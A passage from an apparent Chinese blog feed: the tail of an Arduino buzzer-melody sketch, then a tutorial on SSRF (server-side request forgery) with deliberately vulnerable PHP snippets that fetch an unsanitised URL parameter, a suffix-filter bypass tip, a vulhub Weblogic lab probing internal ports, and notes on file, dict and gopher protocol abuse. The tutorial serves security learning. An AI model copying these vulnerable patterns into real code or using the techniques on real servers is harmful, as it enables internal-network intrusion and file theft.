*/</span></span><br><span class="line">    <span class="built_in">noTone</span>(tonePin);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* 等待5秒，重新开始循环 */</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><audio controls="" preload="" __idm_id__="269361153">  <source    src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/%E7%88%B1%E6%8B%BC%E6%89%8D%E4%BC%9A%E8%B5%A2.mp3"    type="audio/mp3"  />  Your browser does not support the audio tag.</audio><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC0 -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC1 262</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC2 294</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC3 330</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC4 350</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC5 393</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC6 441</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC7 495</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL1 131</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL2 147</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL3 165</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL4 175</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL5 196</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL6 221</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL7 248  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH1 525</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH2 589</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH3 661</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH4 700</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH5 786</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH6 882</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH7 990</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//列出全部C调的频率</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WHOLE 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HALF 0.5</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QUARTER 0.25</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EIGHTH 0.25</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIXTEENTH 0.625</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//列出所有节拍</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tune[]=                 <span class="comment">//根据简谱列出各频率</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  NTC5,NTC5,NTC6,</span><br><span class="line"></span><br><span class="line">  NTCH1,NTC6,NTC5,NTC6,NTCH1,NTC6,NTC5,</span><br><span class="line"></span><br><span class="line">  NTC3,NTC3,NTC3,NTC5,</span><br><span class="line"></span><br><span class="line">  NTC6,NTC6,NTC5,NTCH3,NTCH3,NTCH2,NTCH1,</span><br><span class="line"></span><br><span class="line">  NTCH2,NTCH1,NTCH2,</span><br><span class="line"></span><br><span class="line">  NTCH3,NTCH3,NTCH2,NTCH3,NTCH2,NTCH1,NTCH2,NTCH1,NTC6,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  NTCH2,NTCH2,NTCH2,NTCH1,NTC6,NTC5,</span><br><span class="line"></span><br><span class="line">  NTC6,NTC5,NTC5,NTCH1,NTC6,NTC5,NTC1,NTC3,</span><br><span class="line"></span><br><span class="line">  NTC2,NTC1,NTC2,</span><br><span class="line"></span><br><span class="line">  NTC3,NTC5,NTC5,NTC3,NTCH1,NTC7,</span><br><span class="line"></span><br><span class="line">  NTC6,NTC5,NTC6,NTCH1,NTCH2,NTCH3,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  NTCH3,NTCH2,NTCH1,NTC5,NTCH1,NTCH2,NTCH3,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  NTCH2,NTC0,NTCH3,NTCH2,</span><br><span class="line"></span><br><span class="line">  NTCH1,NTC0,NTCH2,NTCH1,NTC6,NTC0,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  NTCH2,NTC6,NTCH1,NTCH1,NTCH1,NTC6,NTC5,NTC3,</span><br><span class="line"></span><br><span class="line">  NTC5,</span><br><span class="line"></span><br><span class="line">  NTC5,NTC6,NTCH1,NTC7,NTC6,</span><br><span class="line"></span><br><span class="line">  NTCH3,NTCH3,NTCH3,NTCH3,NTCH2,NTCH2,NTCH1,</span><br><span class="line"></span><br><span class="line">  NTC6,NTCH3,NTCH2,NTCH1,NTCH2,NTCH1,NTC6,</span><br><span class="line"></span><br><span class="line">  NTCH1,</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">float</span> durt[]=                   <span class="comment">//根据简谱列出各节拍</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tonepin=<span class="number">8</span>;   <span class="comment">//得用8号接口</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">pinMode</span>(tonepin,<span class="literal">OUTPUT</span>);</span><br><span class="line"></span><br><span class="line">  length=<span class="keyword">sizeof</span>(tune)/<span class="keyword">sizeof</span>(tune[<span class="number">0</span>]);   <span class="comment">//计算长度</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> x=<span class="number">0</span>;x&lt;length;x++)</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">tone</span>(tonepin,tune[x]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">delay</span>(<span class="number">500</span>*durt[x]);   <span class="comment">//这里用来根据节拍调节延时，500这个指数可以自己调整，在该音乐中，我发现用500比较合适。</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">noTone</span>(tonepin);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><blockquote><p>美妙的音乐总是那么短暂，试听结束！</p></blockquote><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://blog.csdn.net/u011481047/article/details/53257685">Arduino+蜂鸣器制作有趣的小音乐</a></p><p>[2] <a href="https://www.geek-workshop.com/thread-288-1-1.html">Arduino学习笔记—超简单制作音乐</a></p><p>[3] <a href="https://blog.csdn.net/m0_37738838/article/details/95062958?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161742198916780262574621%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161742198916780262574621&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-13-95062958.pc_search_result_no_baidu_js&utm_term=arduino+%E8%9C%82%E9%B8%A3%E5%99%A8">Arduino 蜂鸣器播放音乐</a></p>]]></content>
      
      
      <categories>
          
          <category> Arduino </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arduino </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞学习</title>
      <link href="posts/18466.html"/>
      <url>posts/18466.html</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF概念"><a href="#SSRF概念" class="headerlink" title="SSRF概念"></a>SSRF概念</h1><p>SSRF（Server-Side Request Forgery:服务器端请求伪造）是一种由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。正是因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF的攻击目标是攻击者无法直接访问的内网系统。</p><h1 id="SSRF的原理"><a href="#SSRF的原理" class="headerlink" title="SSRF的原理"></a>SSRF的原理</h1><p>SSRF漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能而没有对目标地址做过滤和限制。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等，利用的就是服务端请求伪造，SSRF漏洞可以利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/640"></p><h1 id="SSRF的危害"><a href="#SSRF的危害" class="headerlink" title="SSRF的危害"></a>SSRF的危害</h1><blockquote><ol><li>对外网、服务器所在内网、服务器本地进行端口扫描，获取一些服务的banner信息等。</li><li>攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等。</li><li>对内网Web应用进行指纹识别，识别企业内部的资产信息。</li><li>攻击内外网的Web应用，主要是使用HTTP GET/POST请求就可以实现的攻击，如sql注入、文件上传等。</li><li>利用file协议读取服务器本地文件等。</li><li>进行跳板攻击等。</li></ol></blockquote><h1 id="SSRF测试代码"><a href="#SSRF测试代码" class="headerlink" title="SSRF测试代码"></a>SSRF测试代码</h1><p>SSRF漏洞相关函数</p><blockquote><p><em>file_get_contents()</em> 将整个文件或一个url所指向的文件读入一个字符串中。</p><p><em>readfile()</em> 输出一个文件的内容。</p><p><em>fsockopen()</em> 打开一个网络连接或者一个Unix 套接字连接。</p><p>curl_exec() 执行一个cURL会话,成功返回true，失败返回false。</p><p><em>curl_setopt</em>() 函数将为一个CURL会话设置选项。option参数是你想要的设置,value是这个选项给定的值。</p></blockquote><ol><li><code>file_get_contents()</code>测试代码：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上述测试代码中，<code>file_get_contents()</code> 函数将整个文件或一个url所指向的文件读入一个字符串中，并展示给用户，我们构造好paylaod即可读取服务器本地的任意文件。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401184537457.png" alt="image-20210401184537457"></p><p>也可以进行远程访问：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401184635097.png" alt="image-20210401184635097"></p><p>readfile()函数与filegetcontents()函数相似。</p><ol start="2"><li><code>fsockopen() </code>测试代码：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> fgets(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code> 用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。</p><p>构造 <code>ssrf.php?url=www.baidu.com</code> 即可成功触发ssrf并返回百度主页：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401185335370.png" alt="image-20210401185335370"></p><p>但是该函数的SSRF无法读取本地文件。</p><ol start="3"><li><code>curl_exec() </code> 测试代码：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ch</span> = curl_init();<span class="comment">//初始化curl会话</span></span><br><span class="line">curl_setopt(<span class="variable">$ch</span>,CURLOPT_URL,<span class="variable">$url</span>);<span class="comment">//指定请求的url</span></span><br><span class="line">curl_setopt(<span class="variable">$ch</span>,CURLOPT_HEADER,<span class="number">0</span>);<span class="comment">// 启用时会将头文件的信息作为数据流输出。参数为1表示输出信息头,为0表示不输出</span></span><br><span class="line">curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">curl(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此页面的功能是获取URL参数，然后将URL的内容显示到网页页面上。</p><p>利用上面编写好的SSRF漏洞来测试一下：</p><ul><li>探测一下本地是否存在mysql服务器</li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210331214657070.png" alt="image-20210331214657070"></p><p>出现mysql相关的提示，说明这个服务器上存在mysql。</p><blockquote><p>Tips：如果对url后缀有限制则可以用<code>?</code>或者<code>#</code>绕过，如<code>http://localhost/ssrf/ssrf.php?url=127.0.0.1:3306/?.jpg</code></p></blockquote><ul><li>伪造请求访问百度(用服务器做跳板访问别的网站)</li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210331215034000.png" alt="image-20210331215034000"></p><ul><li>伪造请求探测服务器开放的端口</li></ul><p>和第一点相同，更改不同的端口号进行遍历来判断端口是否开放。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210331215235270.png" alt="image-20210331215235270"></p><ul><li>伪造请求读取服务器(内网)敏感资料</li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210331220047359.png" alt="image-20210331220047359"></p><h1 id="SSRF漏洞测试"><a href="#SSRF漏洞测试" class="headerlink" title="SSRF漏洞测试"></a>SSRF漏洞测试</h1><p>漏洞测试靶场：<strong>vulhub之Weblogic SSRF漏洞</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401220238584.png" alt="image-20210401220238584"></p><p>SSRF漏洞存在于<a href="http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp%EF%BC%8C%E6%88%91%E4%BB%AC%E5%9C%A8brupsuite%E4%B8%8B%E6%B5%8B%E8%AF%95%E8%AF%A5%E6%BC%8F%E6%B4%9E%E3%80%82%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E7%9A%84IP:PORT%EF%BC%8C%E5%A6%82http://127.0.0.1:7001%EF%BC%9A">http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp，我们在brupsuite下测试该漏洞。访问一个可以访问的IP:PORT，如http://127.0.0.1:7001：</a></p><p>可访问的端口将会得到错误，一般是返回status code（如下图），如果访问的非http协议，则会返回did not have a valid SOAP content-type。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401220537141.png" alt="image-20210401220537141"></p><p>修改为一个不存在的端口，将会返回could not connect over HTTP to server。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401220649022.png" alt="image-20210401220649022"></p><p>通过错误的不同，即可探测内网状态。</p><h1 id="SSRF漏洞常见挖掘方法"><a href="#SSRF漏洞常见挖掘方法" class="headerlink" title="SSRF漏洞常见挖掘方法"></a>SSRF漏洞常见挖掘方法</h1><h2 id="SSRF涉及的协议"><a href="#SSRF涉及的协议" class="headerlink" title="SSRF涉及的协议"></a>SSRF涉及的协议</h2><ul><li>file协议：在有回显的情况下，利用 file 协议可以读取任意文件的内容</li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401224611290.png" alt="image-20210401224611290"></p><ul><li>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401224503411.png" alt="image-20210401224503411"></p><ul><li>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)，可用于反弹shell</li><li>http/s协议：探测内网主机存活</li></ul><h2 id="SSRF常见的种类"><a href="#SSRF常见的种类" class="headerlink" title="SSRF常见的种类"></a>SSRF常见的种类</h2><ol><li>远程下载SSRF：可以直接操纵服务器远程下载其他服务器的资源，这种可以完全回显所有信息，危害最大。</li><li>布尔型SSRF：不会回显被攻击的内网信息，是提示true和false，这种对攻击者提供的信息较少，一般只能探测和盲打，利用率不高。</li><li>无回显SSRF：不回显任何信息的SSRF。只能通过dnslog判断ssrf是否存在，无法用来探测内网，只能配合其他信息泄露来盲打内网。单独存在没有危害。</li></ol><h2 id="SSRF通常可能存在的地方"><a href="#SSRF通常可能存在的地方" class="headerlink" title="SSRF通常可能存在的地方"></a>SSRF通常可能存在的地方</h2><ol><li><p>社交分享功能：获取超链接的标题等内容进行显示</p></li><li><p>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p></li><li><p>在线翻译：给网址翻译对应网页的内容</p></li><li><p>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p></li><li><p>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p></li><li><p>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p></li><li><p>网站采集、网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p></li><li><p>数据库内置功能：数据库的比如mongodb的copyDatabase函数</p></li><li><p>邮件系统：比如接收邮件服务器地址</p></li><li><p>编码处理、属性信息处理、文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p></li><li><p>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p><p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p></li><li><p>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p></li></ol><h2 id="SSRF漏洞验证方法"><a href="#SSRF漏洞验证方法" class="headerlink" title="SSRF漏洞验证方法"></a>SSRF漏洞验证方法</h2><ol><li>排除法：浏览器f12查看源代码看是否是在本地进行了请求</li></ol><p>比如：该资源地址类型为 <a 